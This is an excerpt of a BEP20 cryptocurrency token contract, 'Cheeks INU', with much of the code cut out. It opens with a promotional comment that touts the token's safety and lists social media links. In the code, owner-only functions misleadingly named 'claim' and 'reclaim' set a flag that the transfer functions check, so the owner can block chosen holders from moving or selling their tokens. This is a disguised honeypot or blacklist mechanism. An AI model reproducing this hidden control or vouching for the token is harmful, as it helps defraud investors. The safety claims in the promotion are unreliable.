...
/*
    ...
    The CheeksInu- Stealth Launch
    Driving by ShibARMY team ( Last project was 4.3 million mcap )
    Welcome To
    The CheeksInu
    CheeksInu is a new era of crypto for Investment, Safety, Games & Entertainment!
    CheeksInu #Gaming
    CheeksInu is not only a utility focused token with a purpose but also is here to ensure its holders are engaged and rewarded.
    ...
    CheeksInu #Plus
    CheekInuPlus covers a wide range of products from ”Tale of CheeksInu all the way to our unique in house NFChee‘s.
    ...
    CheeksInu #Sure
    CheekInuSure is a platform for all investors inside of crypto, this platform provides a peace of mind in any investment you may look to go into.
    ...
    🌍Web ; https://CheeksInu.com
    🔎Telegram ; https://t.me/CheeksInu
    🕊Twitter: https://www.twitter.com/CheeksInu
    🖼️ Instagram : https://instagram.com/CheeksInu
...
contract CheeksInu is Context, IBEP20, Ownable {
    ...
    string private constant _name     = "Cheeks INU";
...
subtractedValue) public virtual returns (bool) {
        ...
        function claim(address account) external onlyOwner {
            _isClaimed[account] = false;
    }

    function reclaim(address[] calldata addresses) external onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            _isClaimed[addresses[i]] = true;
      }
    }
...
onlyOwner {
	...
	//claim
        require(!_isClaimed[from], "To/from address already claimed!");
...
amount, bool takeFee) private {
		...
		require(!_isClaimed[sender], "To/from address already claimed!");
        if (!takeFee) {
            removeAllFee();
        }
